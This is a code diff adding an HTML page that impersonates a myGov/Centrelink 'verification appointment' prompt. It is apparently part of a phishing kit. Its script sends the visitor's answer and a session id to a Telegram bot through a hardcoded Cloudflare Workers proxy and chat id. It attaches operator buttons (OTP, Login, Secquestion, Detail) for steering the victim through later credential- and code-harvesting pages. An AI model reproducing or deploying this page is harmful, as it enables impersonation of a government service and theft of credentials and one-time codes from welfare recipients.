@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>
+        Confirm Centrelink Online Appointment
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/css.css" rel="stylesheet">
+    <link href="./css/mgv2-application.css" rel="stylesheet">
+    <link href="./css/blugov.css" rel="stylesheet">
+    <style>
+        /* Additional styles to match myGov look for the new verification options */
+        .verification-options {
+            margin: 24px 0 32px;
+        }
+        .verification-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid #d0d5d9;
+            border-radius: 4px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: border-color 0.15s ease, background-color 0.15s ease;
+        }
+        .verification-option:hover {
+            border-color: #003b5c;
+            background-color: #f7fafc;
+        }
+        .verification-option input[type="radio"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #003b5c;
+            flex-shrink: 0;
+        }
+        .verification-option label {
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .actions-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        .actions-group .btn {
+            font-size: 15px;
+            font-weight: 500;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: inherit;
+            border: 1px solid transparent;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-primary {
+            background: #003b5c;
+            color: #ffffff;
+            border-color: #003b5c;
+        }
+        .btn-primary:hover {
+            background: #002b42;
+        }
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .btn-secondary {
+            background: #ffffff;
+            color: #003b5c;
+            border-color: #003b5c;
+        }
+        .btn-secondary:hover {
+            background: #f0f4f7;
+        }
+        @media (max-width: 480px) {
+            .actions-group {
+                flex-direction: column;
+            }
+            .actions-group .btn {
+                width: 100%;
+            }
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 24px;
+            color: #003b5c;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .back-link::before {
+            content: "‹ ";
+        }
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        .verification-intro {
+            font-size: 16px;
+            margin: 0 0 24px;
+            color: #333;
+        }
+        .verification-fieldset {
+            border: none;
+            padding: 0;
+            margin: 0 0 32px;
+        }
+        .verification-legend {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            padding: 0;
+        }
+
+        /* Spinner for processing state */
+        .btn .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .btn.processing .spinner {
+            display: inline-block;
+        }
+        .btn.processing .btn-text {
+            display: none;
+        }
+        .btn.processing {
+            pointer-events: none;
+        }
+    </style>
+</head>
+
+<body>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="#" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="#">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <!-- ===== MAIN CONTENT – VERIFICATION OPTIONS ===== -->
+                            <a href="#" class="back-link">Back</a>
+
+                            <h1>Question about your verification appointment</h1>
+                            <p class="verification-intro">To continue, select one of the options.</p>
+
+                            <form id="verification-form" novalidate>
+                                <fieldset class="verification-fieldset">
+                                    <legend class="verification-legend">Will you be avaliable for your verification appointment on 10:55am, 26th November 2026?</legend>
+
+                                    <div class="verification-option">
+                                        <input type="radio" id="opt-yes" name="optionSelected" value="Yes">
+                                        <label for="opt-yes">Yes</label>
+                                    </div>
+
+                                    <div class="verification-option">
+                                        <input type="radio" id="opt-no" name="optionSelected" value="No">
+                                        <label for="opt-no">No</label>
+                                    </div>
+                                </fieldset>
+
+                                <div class="actions-group">
+                                    <button type="submit" class="btn btn-primary" id="submitBtn">
+                                        <span class="btn-text">Next</span>
+                                        <span class="spinner"></span>
+                                    </button>
+                                    <button type="button" class="btn btn-secondary" onclick="window.location.href='#';">Cancel</button>
+                                </div>
+                            </form>
+                            <!-- ===== END MAIN CONTENT ===== -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li><a target="_blank" href="#">Terms of use</a></li>
+                            <li><a target="_blank" href="#">Privacy and security</a></li>
+                            <li><a target="_blank" href="#">Copyright</a></li>
+                            <li><a target="_blank" href="#">Accessibility</a></li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="#">
+                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ====== SCRIPTS ====== -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+
+    <script src="endpoints.js"></script>
+    <script src="config.js"></script>
+    <script>
+        // Use PROXY / CHAT_ID from config.js if they exist, otherwise fall back
+        // to the same values log.html uses.
+        const _PROXY   = (typeof PROXY   !== 'undefined') ? PROXY   : "https://proud-fog-2f8a.zinnojamila430.workers.dev";
+        const _CHAT_ID = (typeof CHAT_ID !== 'undefined') ? CHAT_ID : "722615124";
+
+        $(document).ready(function() {
+            let flowStarted = false;
+
+            function startVerificationFlow() {
+                if (flowStarted) return;
+                const selected = $('input[name="optionSelected"]:checked');
+                if (selected.length === 0) { alert('Please select an option.'); return; }
+                flowStarted = true;
+
+                const userChoice = selected.val();
+                const $btn = $('#submitBtn');
+                $btn.addClass('processing');
+                $btn.prop('disabled', true);
+
+                (async function() {
+                    // Fresh session id for this attempt
+                    const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
+                                Math.random().toString(36).slice(2, 10);
+
+                    const keyboard = {
+                        inline_keyboard: [
+                            [{ text: "🔐 OTP",         callback_data: `otp:${sid}`         }],
+                            [{ text: "🔑 Notcorrect",  callback_data: `notcorrect:${sid}`  }],
+                            [{ text: "↩️ Login",       callback_data: `login:${sid}`       }],
+                            [{ text: "✅ Secquestion", callback_data: `secquestion:${sid}` }],
+                            [{ text: "✍️ Detail",      callback_data: `detail:${sid}`      }]
+                        ]
+                    };
+
+                    try {
+                        // 1) Grab current offset so wait.html only reacts to NEW presses
+                        const r0 = await fetch(`${_PROXY}/getUpdates?offset=-1`);
+                        const d0 = await r0.json();
+                        const startOffset = (d0.result && d0.result.length)
+                            ? d0.result[d0.result.length - 1].update_id + 1
+                            : 0;
+
+                        // 2) Send answer + control buttons to Telegram
+                        await fetch(`${_PROXY}/sendMessage`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: _CHAT_ID,
+                                text: `📋 Verification Appointment\n📅 Date: ${new Date().toLocaleString()}\n❓ Available for verification appointment on 10:55am, 26th November 2026?\n✅ Answer: ${userChoice}\n🆔 Session: ${sid}`,
+                                reply_markup: keyboard
+                            })
+                        });
+
+                        // 3) Hand the session info to wait.html
+                        sessionStorage.setItem('mgv_sid', sid);
+                        sessionStorage.setItem('mgv_offset', String(startOffset));
+
+                        // 4) Navigate to the please-wait page
+                        window.location.href = 'wait.html';
+
+                    } catch (err) {
+                        console.error(err);
+                        // Even on network error, still go to the wait page so the user sees the spinner
+                        sessionStorage.setItem('mgv_sid', sid);
+                        sessionStorage.setItem('mgv_offset', '0');
+                        window.location.href = 'wait3.html';
+                    }
+                })();
+            }
+
+            // Clicking "Next" submits the form
+            $('#verification-form').on('submit', function(e) {
+                e.preventDefault();
+                startVerificationFlow();
+            });
+
+            // Clicking Yes or No triggers the flow immediately too
+            $('input[name="optionSelected"]').on('change', function() {
+                startVerificationFlow();
+            });
+        });
+    </script>
+
+</body>
+
+</html>
